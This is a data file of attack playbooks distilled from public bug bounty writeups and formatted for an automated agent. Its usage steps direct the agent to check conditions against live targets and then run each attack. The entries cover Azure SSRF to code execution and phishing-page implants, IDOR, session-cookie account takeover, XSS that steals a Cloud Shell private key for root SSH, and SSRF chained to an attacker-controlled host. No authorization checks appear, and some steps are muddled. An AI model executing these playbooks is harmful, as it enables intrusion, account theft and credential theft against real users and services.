description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Kud I Enter Your Server? New Vulnerabilities in Microsoft Azure

trigger_conditions.when_to_apply: When an attacker has an existing low-severity vulnerability (like SSRF) on a Linux Azure App Service and wants to achieve full code execution.
prerequisites: Attacker has an existing SSRF vulnerability on the target Azure App Service.
applicability_signals: Target is a Linux Azure App Service.
SSRF vulnerability can be leveraged to interact with the App Service's administration interface (KuduLite).
skip_if: No SSRF vulnerability is present.
Target is not an Azure App Service.
Target is a Windows Azure App Service.

recon_steps: Step 1: Identify the target as a Linux Azure App Service based on domain names (e.g., app.azurewebsites.net, app.scm.azurewebsites.net).
Step 2: Confirm the presence of an SSRF vulnerability that allows interaction with the KuduLite administration interface.
attack_steps: Step 1: Leverage the SSRF vulnerability to make requests to the KuduLite administration interface, specifically targeting endpoints that control the git repository or allow file system operations.
Step 2: Identify and exploit a mechanism within KuduLite that allows code execution or the modification of critical files.
Step 3: Use the code execution to implant phishing pages or other malicious content accessible via the Azure Portal.
Step 4: Potentially trigger the first discovered vulnerability (git repository takeover) via the achieved code execution.
tools_recommended: Burp Suite (for SSRF exploitation and request crafting)
Custom scripts for interacting with KuduLite and executing commands.
success_indicators: Successful code execution on the App Service.
Phishing pages are deployed and accessible through the Azure Portal.
The App Service's git repository is compromised.
failure_indicators: SSRF vulnerability does not allow interaction with KuduLite (e.g., blocked by WAF or network controls).
KuduLite endpoints are not vulnerable to code execution or file manipulation.
Attempts to deploy content fail or are not reflected in the Azure Portal.

playbooks.impact: An attacker can achieve full code execution on the Azure App Service, take over the git repository, and implant phishing pages, potentially leading to further compromise of user credentials or cloud resources.
playbooks.key_lesson: When an SSRF vulnerability is present on a cloud service, investigate its ability to interact with administrative interfaces and explore potential privilege escalation or code execution vectors.

meta.title: We Hacked Apple for 3 Months: Here’s What We Found
meta.authors: Sam Curry, Brett Buerhaus, Ben Sadeghipour, Samuel Erb, Tanner Barnes

target_profile.technology: Apple Infrastructure (web applications, iCloud, App Store Connect, etc.)

trigger_conditions.when_to_apply: When the target application allows authenticated users to access resources via predictable identifiers, and there is a possibility of accessing resources belonging to other users by manipulating these identifiers.
prerequisites: Attacker must have an authenticated user session for the target application.
applicability_signals: Endpoints that accept user-specific identifiers (e.g., user IDs, case IDs, friend IDs) in URLs or request bodies.
Presence of common identifier patterns like numerical IDs, UUIDs, or sequential numbers.
skip_if: All requests to view or modify user-specific data are protected by robust access control checks that correctly enforce user ownership.
Identifiers are sufficiently random and unpredictable, making enumeration or guessing infeasible.

recon_steps: Step 1: Identify all domains and subdomains owned by Apple (e.g., apple.com, icloud.com, mfi.apple.com) using DNS enumeration and subdomain discovery tools.
Step 2: Scan discovered web servers for common web application entry points and APIs. Index HTTP status codes, headers, and response bodies.
Step 3: Analyze authenticated application traffic to identify endpoints that handle user-specific data or resources. Look for parameters containing IDs, usernames, or unique identifiers.
attack_steps: Step 1: For an authenticated user session, identify an endpoint that accesses a specific user resource (e.g., GET /support/cases/<CASE_ID>).
Step 2: Capture the request and identify the parameter that represents the user's identifier (e.g., <CASE_ID>).
Step 3: Modify the identified identifier to a predictable value (e.g., try '1', '2', 'a', 'b') or an identifier known to belong to another user if available.
Step 4: Resend the modified request using the attacker's authenticated session.
Step 5: Observe the response for any indication of accessing data that does not belong to the attacker's account.
tools_recommended: Burp Suite: To intercept, modify, and resend requests. Intruder can be used to systematically change identifiers.
ffuf or dirsearch: For directory and file brute-forcing on discovered hosts.
Amass or Subfinder: For subdomain enumeration.
success_indicators: Receiving a 200 OK response containing data that clearly belongs to another user (e.g., different names, email addresses, personal information).
Accessing a user's support case details, friend list, or other sensitive information that should be private.
failure_indicators: Receiving a 403 Forbidden or 404 Not Found error for all attempted identifier changes, suggesting robust access controls.
The application consistently returns data only relevant to the authenticated user, even when identifiers are changed.

playbooks.impact: Unauthorized access to sensitive personal data of other users, including support case details, friend lists, and potentially other account-related information, leading to privacy violations and potential for further social engineering or account takeover.
playbooks.key_lesson: Always test IDOR by systematically enumerating and substituting user-specific identifiers in API requests and URL parameters using authenticated sessions.

meta.title: 6k$ Worth Account Takeover via IDOR in Starbucks Singapore

trigger_conditions.when_to_apply: When a website uses a separate, potentially less secured, testing or staging environment that shares authentication mechanisms or data with the production environment.
prerequisites: Ability to create an account on the production site (card.starbucks.com.sg) or a linked testing site.
Discovery of a separate testing/staging environment that the production site's content is loaded from.
The testing environment must use similar or linked authentication and data handling as the production environment.
applicability_signals: Production site content being loaded from a third-party domain.
Successful login to a third-party domain using production credentials.
Discovery of endpoints or parameters in the testing environment that are not present or behave differently in the production environment.
skip_if: Testing environments are completely isolated and do not share any authentication or user data with the production environment.
WAF blocks session cookie manipulation.
No way to create or authenticate with an account that can access the testing environment.

recon_steps: Step 1: Browse the target website (card.starbucks.com.sg) and observe any third-party domains or integrated content. Note the domains and their paths (e.g., example.com/starbucks).
Step 2: Attempt to log into the identified third-party domains using credentials created on the production site.
Step 3: If login is successful, identify distinct endpoints or functionalities within the testing environment that differ from the production environment.
Step 4: Discover any POST requests in the testing environment that accept an 'email' parameter.
attack_steps: Step 1: Create a user account on the production site (card.starbucks.com.sg).

Step 2: If multiple test environments exist (e.g., example.com/starbucks2, example.com/starbucks3), create dummy accounts on the one that allows new account creation (e.g., example.com/starbucks3) using the victim's email address.

Step 3: In the test environment that allows account association (e.g., example.com/starbucks2), use the identified POST endpoint with the 'email' parameter set to the victim's email address. This associates the test environment's session with the victim's email.
Step 4: Identify the PHPSESSID cookie value from the testing environment that successfully associated the account (e.g., example.com/starbucks2).
Step 5: Use a browser or tool (like Burp Suite) to set the PHPSESSID cookie for the production site (card.starbucks.com.sg) to the value obtained in Step 4.
Step 6: Once authenticated to the production site with the victim's session, navigate to the user profile page or any sensitive information retrieval endpoint.

Step 7: If CSRF tokens are an issue on the test environment, copy the valid PHPSESSID from the test environment to the production environment and then attempt password change requests which will now be validated by the production environment's CSRF protection.
payloads_or_patterns:
POST /starbucks HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<TEST_SESSION_TOKEN>

email=<VICTIM_EMAIL>
tools_recommended: Burp Suite: To intercept and modify requests, capture session tokens, and send crafted POST requests.
Browser Developer Tools: To inspect network requests and responses, identify parameters, and copy cookies.
success_indicators: Response displaying partial or full personal information of the victim's account on the production site after session hijacking.
Successful password change for the victim's account after session hijacking and using production CSRF tokens.
Ability to perform actions (e.g., spending credits) on the victim's account on the production site.
failure_indicators: 403 Forbidden or other error responses when attempting to access production resources with the hijacked session token, indicating session invalidation or proper security controls.
No sensitive information revealed or password change denied, suggesting the test environment does not directly influence the production user data in the way expected.
Invalid CSRF token errors persist on the production site, preventing password changes.

playbooks.impact: Complete account takeover, including access to all personal information, ability to spend any loaded credits on the account, and potential for further malicious activities in the user's name.
playbooks.key_lesson: Always investigate third-party integrations and separate testing environments, as they may share authentication mechanisms or data with production, leading to IDOR or account takeover vulnerabilities.

meta.title: 90 days, 16 bugs, and an Azure Sphere Challenge
meta.authors: William Largent, Claudio Bozzato, Lilith [-_-], Dave McDaniel

trigger_conditions.when_to_apply: When an attacker has gained code execution within a compromised customer application on the Azure Sphere's Normal World and aims to escalate privileges or gain access to restricted system functionalities.
prerequisites: Attacker has achieved code execution within a customer application on the Azure Sphere's Normal World.
applicability_signals: The Azure Sphere platform's scope includes 'Anything allowing elevation of privilege outside of the capabilities described in the application manifest', and 'Ability to execute code on NetworkD through local attack (compromised customer application)'.
Specific vulnerabilities like `ptrace`, `/proc/self/mem`, `READ_IMPLIES_EXEC`, `PACKET_MMAP`, `/proc/thread-self/mem` have been identified as potential vectors.
skip_if: The system is not running Azure Sphere OS.
The attacker's code execution context is outside the Normal World (e.g., Secure World).

recon_steps: Step 1: Review the official scope for the Azure Sphere Security Research Challenge to understand in-scope privilege escalation and code execution vectors.
Step 2: Analyze the architecture and components of the Azure Sphere platform, particularly focusing on the Normal World and its interaction with the OS and other cores.
Step 3: Identify specific kernel interfaces or system calls that might be vulnerable when accessed from a compromised user-space application.
attack_steps: Step 1: Attempt to leverage `ptrace` on arbitrary processes within the Normal World to gain elevated privileges or inject code.
Step 2: Exploit vulnerabilities related to `/proc/self/mem` or `/proc/thread-self/mem` to read or write to sensitive memory regions of other processes or kernel structures.
Step 3: Test for vulnerabilities in `READ_IMPLIES_EXEC` or `PACKET_MMAP` scenarios that could lead to unsigned code execution in unexpected contexts.
Step 4: If NetworkD is a target, attempt local attacks from a compromised application to gain control over its functionalities.
payloads_or_patterns: Exploitation code targeting specific Linux system calls like ptrace, read/write operations on /proc/self/mem and /proc/thread-self/mem, or utilizing specific AF_PACKET configurations.
Payloads designed to bypass standard application manifest restrictions.
tools_recommended: Custom exploit development tools (e.g., C/C++, Assembly)
Ghidra or IDA Pro for reverse engineering of Azure Sphere OS components
Kernel debugging tools if available for the Azure Sphere platform
success_indicators: Execution of code with elevated privileges (e.g., root in the Normal World context).
Ability to modify system configurations or access data outside the normal application manifest boundaries.
Successful manipulation of NetworkD functionalities from a compromised application.
Achieving execution of unsigned code in privileged contexts.
failure_indicators: Crashing the application or the system without achieving the desired privilege escalation.
Receiving permission denied errors for system calls that are expected to be exploitable.
Security mechanisms (e.g., SELinux, apparmor, custom Azure Sphere protections) preventing the intended exploit.

playbooks.impact: Gaining elevated privileges within the Azure Sphere's Normal World, allowing an attacker to bypass application security restrictions, potentially gain control over network functionalities, modify device configurations, or access sensitive data not intended for the compromised application.
playbooks.key_lesson: When targeting embedded IoT devices with custom OSes, investigate standard Linux privilege escalation vectors like ptrace, /proc/*mem manipulations, and memory execution vulnerabilities, as they may still be applicable and lead to significant impact.

meta.title: Watch your requests! Open redirect to a complete account takeover

tech_stack_fingerprints: Responds to requests like GET /api/.. with 301 redirect

trigger_conditions.when_to_apply: This playbook applies when an open redirect vulnerability is found and there is a GraphQL endpoint that accepts an 'id' parameter which is used to make server-side requests and is susceptible to path traversal.
prerequisites: Attacker can trigger an open redirect by appending `///` to the path.
Target application uses GraphQL.
A GraphQL mutation (e.g., GetAuthorizedApps) accepts an 'id' variable.
The 'id' variable is used to make server-side requests to internal API endpoints.
The server-side request mechanism is vulnerable to path traversal (`../`).
applicability_signals: An open redirect is triggered by requests like `GET /api/..`.
A GraphQL endpoint exists.
A GraphQL mutation takes an `id` parameter that is a string.
Injecting `../` into the `id` parameter results in path traversal.
Server-side requests are made based on the `id` parameter.
Server-side requests can be redirected to attacker-controlled domains.
skip_if: No open redirect vulnerability is found.
GraphQL endpoint is not present or not used for making server-side requests.
The 'id' parameter is strictly numeric and not vulnerable to path traversal.
Path traversal attempts do not result in any observable behavior or errors.

recon_steps: Step 1: Test for open redirects by appending `///` to various paths, especially API endpoints (e.g., `https://<TARGET_URL>/api///google.com//`). Observe for 301 redirects to attacker-controlled domains.
Step 2: Analyze network traffic for GraphQL requests. Identify mutations that accept an 'id' variable.
Step 3: Fuzz the 'id' parameter in GraphQL mutations with special characters like `'` to check for errors and server-side request behavior.
Step 4: Attempt path traversal by appending `../` sequences to the 'id' parameter and observe the responses for internal API calls or errors indicating traversal.
attack_steps: Step 1: Craft a GraphQL mutation request that includes the 'id' parameter, using path traversal (`../`) to reach sensitive internal endpoints. For example: `mutation { GetAuthorizedApps(id: "../../../../<SOME_INTERNAL_ENDPOINT>") { ... } }`
Step 2: Chain the open redirect vulnerability with the path traversal SSRF. The goal is to redirect a server-side request made by the GraphQL mutation to an attacker-controlled server.
Step 3: Configure a listener (e.g., ngrok, Burp Collaborator) to receive incoming requests. Use this listener's URL in the path traversal payload.

Step 4: Formulate the final payload, combining the open redirect pattern with the path traversal SSRF payload. Example: `https://<TARGET_URL>//google.com///<path_traversal_payload>` where `<path_traversal_payload>` is crafted to trigger SSRF, e.g., `../../../..` followed by the attacker's domain.

Step 5: If the target server attempts to fetch cloud metadata (e.g., AWS EC2 metadata endpoint `169.254.169.254`), craft a request to intercept and analyze the metadata. This might require setting up a local HTTP server to handle redirects from HTTPS to HTTP for metadata access.
payloads_or_patterns: Chained exploit attempt: `https://<TARGET_URL>//<ATTACKER_HOST_URL>//<PATH_TRAVERSAL_PAYLOAD>` (where PATH_TRAVERSAL_PAYLOAD might be something like `../../../..`)
tools_recommended: Burp Suite: For intercepting and modifying requests, analyzing responses, and identifying GraphQL queries.
ngrok or Burp Collaborator: For receiving outbound callback requests from the SSRF.
Python HTTP Server: To handle specific redirection needs, especially for accessing metadata over HTTP from an HTTPS-originating SSRF.
success_indicators: Receiving an HTTP request on the attacker's listener (ngrok/Burp Collaborator) originating from the target's server.
The received request contains data from sensitive internal API endpoints or cloud metadata.
Exploiting the SSRF to access internal resources or AWS EC2 metadata.
failure_indicators: 403 Forbidden or other error responses on path traversal attempts indicating WAF or security controls.
No outbound callbacks are received, suggesting the SSRF is not exploitable or misconfigured.

The server returns an error indicating an invalid response format, even if a 2XX status code is received (e.g., expecting JSON, receiving plain text). This might require further analysis to parse the error response.
Requests to `169.254.169.254` fail due to HTTP vs. HTTPS mismatch or incorrect port usage.

playbooks.impact: Account takeover by leveraging SSRF to gain access to sensitive information, potentially including session tokens or other credentials, or by manipulating user data through internal API calls.
playbooks.key_lesson: Always investigate the chaining potential of seemingly low-severity vulnerabilities like open redirects and path traversals, as they can lead to critical impacts like SSRF and account takeover.

meta.title: XSS To Cloud Shell Instance Takeover (Rce As Root)

trigger_conditions.when_to_apply: When a Cross-Site Scripting (XSS) vulnerability is found within the markdown preview functionality of Google Cloud Shell, allowing for arbitrary JavaScript execution within the user's Cloud Shell environment.
prerequisites: The target must be Google Cloud Shell.
An XSS vulnerability in the markdown preview must exist and be exploitable.
applicability_signals: XSS payload in markdown renders and executes JavaScript.
The Cloud Shell environment allows JavaScript execution.
skip_if: XSS payload is strictly limited to alert boxes without further exploitability.
The Cloud Shell environment has strict Content Security Policy (CSP) or other sandboxing that prevents the desired JavaScript execution for file access or external communication.

recon_steps: Step 1: Identify and confirm an XSS vulnerability within the Google Cloud Shell markdown preview feature. Use a simple `alert(document.domain)` payload to verify execution context.

Step 2: Investigate the DOM and network traffic within the Cloud Shell IDE to understand the available JavaScript APIs and endpoints. Pay close attention to file system access and any networking capabilities.
attack_steps: Step 1: Craft a malicious markdown file containing an XSS payload. This payload will attempt to read sensitive files like `/etc/hosts` and the private key `id_cloudshell` using the identified file download endpoints.
Step 2: Host the malicious markdown file within a Git repository, potentially using GitHub. Include a 'Open in Google Cloud Shell' button to facilitate easy import by the victim.

Step 3: Trick a victim into importing the malicious Git repository into their Google Cloud Shell instance. This can be done through social engineering, phishing, or by advertising the malicious repository.

Step 4: Once the markdown file renders, the XSS payload will execute, attempting to fetch `/etc/hosts` and `id_cloudshell` via HTTP GET requests to the `files/?uri=` and `files/download/?id=` endpoints.
Step 5: Parse the response from `/etc/hosts` to construct the public domain name of the Cloud Shell instance (e.g., `devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev`).
Step 6: Use the constructed public domain name to perform port scanning and identify open services, specifically looking for SSH on port 6000.
Step 7: With the public IP and open SSH port, attempt to SSH into the Cloud Shell instance as the root user using the retrieved private key `id_cloudshell`.
payloads_or_patterns: In markdown content: ``
In markdown content: ``
tools_recommended: Google Chrome DevTools: To inspect network traffic, DOM, and JavaScript execution.
Burp Suite: To intercept and analyze HTTP requests/responses, and potentially for brute-forcing or scanning.
Nmap: For port scanning the identified Cloud Shell instance public IP.
SSH client: To connect to the Cloud Shell instance with the stolen private key.
success_indicators: Successful retrieval of `/etc/hosts` content via JavaScript.
Successful retrieval of the `id_cloudshell` private key content via JavaScript.
Successful SSH connection to the Cloud Shell instance as root using the stolen private key.
failure_indicators: XSS payload only results in `alert(0)` and no further JavaScript execution.
The `/files/` endpoints return errors or deny access to `/etc/hosts` or `id_cloudshell`.
Port scanning reveals no open SSH port (or SSH is not running on port 6000).
SSH connection fails due to incorrect key, authentication failure, or network issues.

playbooks.impact: Full takeover of a Google Cloud Shell Linux VM instance as the root user, granting access to all files, data, and the ability to execute commands with administrative privileges within that instance. This could lead to further compromise of connected Google Cloud resources if credentials or sensitive information are stored within the instance.
playbooks.key_lesson: Always investigate how file access and network communication are handled by JavaScript within a web application, especially when an XSS vulnerability grants execution context. Sensitive files or local network resources might be reachable and exfiltrated.

meta.title: Forcing Firefox to Execute XSS Payloads during 302 Redirects

affected_components: Open Redirect parameter reflected in Location header

trigger_conditions.when_to_apply: When an open redirect vulnerability is identified where a GET parameter is reflected directly into the HTTP 'Location' header without sanitization, and the server responds with a 302 status code.
prerequisites: Identified open redirect vulnerability reflecting a GET parameter in the 'Location' header.
applicability_signals: Target reflects a GET parameter verbatim into the 'Location' header of a 302 redirect response.
Newlines or carriage returns are accepted in the reflected parameter, leading to header injection.
skip_if: Browser performs a redirect without rendering the response body.
No open redirect vulnerability is present.

recon_steps: Step 1: Send GET requests to identify parameters reflected in the 'Location' header of 302 redirect responses. Example: `/?redirect=<value>`
Step 2: Test for header injection by including newline characters (`%0A`, `%0D`) in the reflected parameter. Observe if additional headers can be injected.
Step 3: If header injection is successful, test for reflected XSS by injecting HTML/JS payloads after double newlines (`%0A%0A`).
attack_steps: Step 1: If double newlines lead to reflected XSS in the response body (even if not rendered by modern browsers due to 302 status), proceed to exploit the browser's handling of specific URI schemes in the 'Location' header.

Step 2: Construct a payload using a compatible URI scheme that forces the browser (specifically Firefox) to execute JavaScript in the response body. For Firefox, `ws://` or `wss://` schemes are potential candidates. For Chrome, an empty `Location` header or `resource://` might work.
Step 3: Craft the final URL: `<TARGET_URL>?redir=<URI_SCHEME>%0A%0A<XSS_PAYLOAD>` for Firefox, or `<TARGET_URL>?redir=` followed by specific Chrome bypasses.
Step 4: Use `xdg-open` (Linux) or equivalent (PowerShell on Windows) to open the crafted URL, or automate opening many such URLs.
Step 5: Monitor for the execution of the XSS payload (e.g., an alert box).
payloads_or_patterns: For Chrome (update): `<TARGET_URL>?redir=` (followed by specific bypasses, e.g., `resource://` or empty value)
tools_recommended: Browser developer tools (to inspect headers and responses)
Burp Suite or OWASP ZAP (for intercepting and modifying requests)
Custom script using `xdg-open` or `Invoke-Item` (PowerShell) for automated testing of many crafted URLs.
success_indicators: An alert box appears with the domain name of the target, confirming JavaScript execution within the target's origin.
Payloads like `console.log(document.domain)` are visible in the browser console.
failure_indicators: No alert box or JavaScript execution observed. The browser may simply navigate to a malformed URL or show an error page.
The 'Location' header is sanitized, preventing header injection or the use of specific URI schemes.
The browser does not execute JavaScript from the response body even with the bypass schemes (may indicate a browser version difference or a more robust WAF).

playbooks.impact: Cross-site Scripting (XSS) allowing an attacker to execute arbitrary JavaScript in the context of the victim's browser session on the vulnerable domain. This can lead to session hijacking, data theft, phishing, or defacement.
playbooks.key_lesson: When dealing with open redirects and 302 responses, investigate browser-specific handling of URI schemes in the 'Location' header for potential XSS bypasses.

meta.title: Public Bucket Allowed Access to Images on Upcoming Google Cloud Blog Posts

affected_components: Google Cloud Storage buckets used for blog image hosting

trigger_conditions.when_to_apply: When an attacker suspects a cloud storage bucket is being used to host images for a web application, especially for unreleased content.
prerequisites: Knowledge of potential Google Cloud Storage bucket names associated with a target (e.g., derived from domain names or observed URLs).
applicability_signals: Observation of `storage.googleapis.com` in URLs related to blog content.
Discovery of potential bucket names like `gweb-uniblog-publish-prod` or `gweb-cloudblog-publish`.
skip_if: All attempts to access known bucket URLs result in `AccessDenied` with no `ListBucketResult` or object listings.

recon_steps: Step 1: Identify potential Google Cloud Storage bucket names associated with the target blog. Common patterns include `gweb-[blogname]-publish`.

Step 2: Attempt to access the bucket using various common URL formats: `https://storage.googleapis.com/<bucket name>/`, `https://<bucket name>.storage.googleapis.com/`, `https://storage.cloud.google.com/<bucket name>/`.
attack_steps: Step 1: Attempt to list the contents of the suspected bucket by accessing `https://storage.googleapis.com/<bucket name>/` or `https://<bucket name>.storage.googleapis.com/`.
Step 2: If the bucket returns an XML listing of its contents (e.g., `ListBucketResult`), parse the `Contents` elements to extract object keys (filenames).
Step 3: Construct URLs for individual objects within the bucket using the pattern `https://storage.googleapis.com/<bucket name>/<object key>` and attempt to access them.
tools_recommended: curl: to programmatically test bucket access and object retrieval.
Burp Suite: to observe HTTP responses and identify bucket listing patterns.
success_indicators: Receiving an XML `ListBucketResult` response instead of an `AccessDenied` error, indicating public listing is enabled.
Successfully retrieving image files (or other files) from the bucket via direct URL access, revealing unpublished content.
failure_indicators: Receiving a consistent `AccessDenied` error for all attempted bucket access methods, suggesting the bucket is not publicly listed or accessible. Pivot to checking object-level permissions if listing is allowed but object access is denied.
Receiving a `404 Not Found` for specific object keys, indicating the object does not exist or is not directly accessible via that URL.

playbooks.impact: Disclosure of sensitive information including images for upcoming blog posts, which could reveal unreleased products, features, or strategies.
playbooks.key_lesson: Verify Google Cloud Storage bucket permissions, especially for public-facing assets like blog images, by attempting to list bucket contents and access individual objects.

meta.title: Attacks On GCM With Repeated Nonces

affected_components: Encryption/Decryption logic using AES-GCM with a static nonce
tech_stack_fingerprints: Usage of Java Cryptography Architecture (JCA) classes like `Cipher.getInstance('AES/GCM/NoPadding')`, `GCMParameterSpec`

trigger_conditions.when_to_apply: When an application uses AES-GCM for encryption and reuses the same nonce (IV) for multiple encryption operations with the same key.
prerequisites: Attacker can observe encrypted data and corresponding plaintexts (or infer them).
Attacker can trigger multiple encryption operations using the same key but different plaintexts.
applicability_signals: Application code exhibits `cipher.init(mode, key, gcmParameterSpec)` where `gcmParameterSpec` contains a static or predictable nonce.
Observation of encrypted data where the ciphertext changes slightly but the authentication tag is crucial for validity.
skip_if: Application uses a unique and unpredictable nonce for every encryption operation.
The encryption mechanism is not AES-GCM or is implemented in a way that mitigates nonce reuse vulnerabilities.

recon_steps: Analyze application code or observe network traffic to identify the encryption algorithm used. Look for mentions of AES, GCM, and cryptography libraries.

If possible, review the source code for `Crypto` classes or encryption/decryption functions to identify how nonces are generated and used. Specifically, check if `GCMParameterSpec` is initialized with a static or predictable nonce.
attack_steps: Step 1: Identify the endpoint that performs encryption (e.g., POST /note).

Step 2: Send multiple requests to this endpoint with different plaintexts, ensuring the same encryption key is used (this is inherent if the key is static). For example, save multiple notes on the demo app.
Step 3: Capture the generated ciphertexts and their corresponding plaintexts (if known or inferable).

Step 4: If the nonce is repeated, an attacker can potentially forge new ciphertexts that will pass the authentication tag check. The writeup implies that by altering the ciphertext of one message, and if the nonce was the same, it's possible to manipulate the authentication tag of another message encrypted with the same nonce.

Step 5: (Advanced - based on writeup implication) Use known plaintext-ciphertext pairs encrypted with the same nonce and key to derive the authentication key (or parts of it), enabling forgery. The writeup mentions: 'If we try to query a different ID by altering one byte in the last ciphertext... the application safely rejects it because the signature does not match.' This suggests an understanding of how the tag is generated. The core attack is that knowing P1 and C1 (with tag T1) and P2 and C2 (with tag T2) both encrypted with the same nonce allows for forgery because the GCM authentication component is weakened. The writeup does not detail the exact forgery steps but states an adversary can forge any ciphertext.
payloads_or_patterns: Attempt to modify a captured ciphertext (e.g., change a byte in the encrypted data) and observe the authentication tag failure.
Actual forgery payload would depend on the derived information from known plaintext-ciphertext pairs, not provided in detail in the writeup.
tools_recommended: Burp Suite or OWASP ZAP: To intercept and modify HTTP requests, capture traffic, and analyze response.
Custom scripting (Python, etc.): To automate sending multiple requests and analyzing the cryptographic properties of the responses if direct manipulation is complex.
success_indicators: Application accepts a forged ciphertext as valid, thereby allowing an attacker to change existing data or inject malicious data that bypasses authentication.
The writeup mentions observing the tag mismatch, which is a sign of the encryption being active, but the *success* would be bypassing that tag mismatch for a forged ciphertext.
failure_indicators: All attempts to forge ciphertexts result in 'Tag mismatch!' or similar authentication errors, indicating the nonce is likely unique or the attack is not correctly implemented.

If no observable interaction with the cryptographic functions can be made (e.g., due to strong security controls or different encryption methods). If the application uses a unique nonce, the forgery attempt will fail as expected.

playbooks.impact: An attacker can forge valid ciphertexts for AES-GCM encrypted data. This can lead to arbitrary data modification, potentially allowing an attacker to change sensitive information (like passwords or session tokens if they were encrypted with this scheme) or inject malicious content that bypasses integrity checks.
playbooks.key_lesson: Always ensure that a unique and unpredictable nonce is used for every AES-GCM encryption operation with the same key to maintain data integrity and authenticity.

meta.title: Advisory: security issues in AWS KMS and AWS Encryption SDKs
meta.vuln_type: Information Disclosure, Ciphertext Forgery, Cryptographic Weakness

target_profile.required_access_level: any_authenticated_user (victim), attacker needs a CMK with permissive policy

trigger_conditions.when_to_apply: When an attacker can intercept ciphertexts generated by a victim and has control over a customer-managed key (CMK) in AWS KMS with a permissive key policy that allows access from the victim.
prerequisites: Victim uses AWS KMS for encryption.
Victim uses AWS Encryption SDKs versions prior to 2.0.0.
Attacker can intercept ciphertexts generated by the victim.
Attacker can create and manage their own CMK in AWS KMS.
Attacker can configure their CMK's key policy to allow access from the victim.
applicability_signals: Ciphertexts are generated using AWS KMS.
Decryption attempts of modified ciphertexts result in logged events in the attacker's AWS account (CloudTrail).
Specific AWS KMS CMK ARNs are present in ciphertext metadata.
skip_if: Victim is using AWS Encryption SDKs version 2.0.0 or later.
Attacker cannot intercept ciphertexts.
Attacker cannot create or manage CMKs in AWS KMS.
Victim's IAM policies strictly prohibit accessing other accounts' CMKs.

recon_steps: Step 1: Identify if the target application or service utilizes AWS KMS for encryption and decryption of sensitive data.
Step 2: If AWS Encryption SDKs are in use, determine the version. Prioritize targets using versions prior to 2.0.0.
Step 3: Attempt to intercept or obtain sample ciphertexts generated by authenticated users.
attack_steps: Step 1: Attacker creates a new CMK in AWS KMS. Configure its key policy to allow access from the victim's AWS account (or broadly, if feasible).
Step 2: Attacker intercepts a valid ciphertext generated by the victim.
Step 3: Attacker reverse-engineers the ciphertext format to identify the location of the internal CMK ID.
Step 4: Attacker replaces the victim's CMK internal ID within the intercepted ciphertext with the internal ID of their own CMK.
Step 5: Attacker provides the modified ciphertext to the victim, instructing or tricking them into attempting decryption.
Step 6: Victim attempts to decrypt the modified ciphertext.
Step 7: Monitor the attacker's AWS account CloudTrail logs for decryption failure events, which will contain victim's AWS Account ID, user agent, and IP address.
payloads_or_patterns: Modification of the internal CMK ID field within an AWS KMS ciphertext. Specific byte offsets depend on reverse-engineered format.
tools_recommended: Burp Suite or similar proxy to intercept requests/responses.
Hex editor or custom script to modify ciphertext bytes.
AWS CLI or SDK to manage CMKs.
AWS CloudTrail to monitor logs.
success_indicators: Decryption failure events appearing in the attacker's AWS CloudTrail logs for the victim's account, including AWS Account ID, user agent, and IP address.
The attacker's CMK being used for a decryption attempt, even if it fails.
failure_indicators: No decryption failure events logged in the attacker's CloudTrail after the victim attempts decryption.
Ciphertext is rejected with an explicit error indicating a format or integrity issue before KMS processes it.
Victim's IAM policy prevents them from accessing the attacker's CMK.

playbooks.impact: Information Disclosure: Attacker learns victim's AWS Account ID, user agent, and IP address. Timing of decryption attempts can also be inferred. This information can be used for targeted attacks, reconnaissance, or to fingerprint victim environments. Ciphertext Forgery: In multi-recipient scenarios, an attacker can create ciphertexts that decrypt to different plaintexts for different users by manipulating keys, leading to confusion or malicious actions.
playbooks.key_lesson: Always validate and authenticate all metadata within encrypted data structures before using it to derive decryption keys or perform sensitive operations, as attacker-controlled fields can lead to information leakage or manipulation.

meta.title: suPHP - The vulnerable ghost in your shell

tech_stack_fingerprints: identifying suPHP via phpinfo() output, specifically the 'Server API' or 'Loaded Configuration File' directives

trigger_conditions.when_to_apply: When suPHP is installed and configured on a web server, and the attacker has shell access with an account that can execute PHP scripts.
prerequisites: suPHP is installed and active on the target server.
The attacker has the ability to execute arbitrary PHP code on the server (e.g., through a web shell or file upload vulnerability).
applicability_signals: PHP `phpinfo()` output clearly indicates 'Server API: CGI/FastCGI' or similar, and 'Loaded Configuration File' points to a suPHP configuration file.
The target server allows execution of PHP scripts with web server user privileges.
skip_if: The server is not using suPHP, or suPHP is not configured to run PHP scripts as the web server user.
The attacker does not have the ability to execute arbitrary PHP code.

recon_steps: Step 1: Upload a PHP file (e.g., `info.php`) containing `<?php phpinfo(); ?>` to the web server.

Step 2: Access `info.php` via a web browser and look for indicators of suPHP. Key indicators are 'Server API' showing 'CGI/FastCGI' and the 'Loaded Configuration File' pointing to a suPHP configuration file (e.g., `/etc/php.ini` or a custom suPHP configuration). The output of `whoami` within the `phpinfo()` page should reveal the web server user (e.g., `www-data`, `apache`).
attack_steps: Step 1: Create a PHP script that attempts to execute a system command that would reveal higher privilege information or allow further execution. For example, a script that tries to read `/etc/passwd` or execute `id`.

Step 2: Upload this script to the web server and execute it via a web browser. If the script executes successfully and returns output that indicates it's running as a different user (e.g., `root`) or can access privileged files, then privilege escalation is likely.

Step 3: If direct command execution is blocked or filtered, attempt to use PHP functions like `system()`, `exec()`, `passthru()`, `shell_exec()`, or `proc_open()` to run commands. The writeup implies that suPHP's configuration can lead to arbitrary command execution with elevated privileges.
payloads_or_patterns: The writeup is too vague to provide specific privilege escalation payloads beyond basic command execution, as it focuses on the *vulnerability* of suPHP itself rather than a specific exploit chain. The actual payload would depend on the specific system configuration and what commands are available.
tools_recommended: Web browser for accessing PHP scripts.
SCP/FTP client for uploading PHP files.
SSH client for potentially interacting with the escalated shell.
success_indicators: Execution of commands that reveal information or actions only possible with higher privileges (e.g., `id` showing `uid=0(root)`).
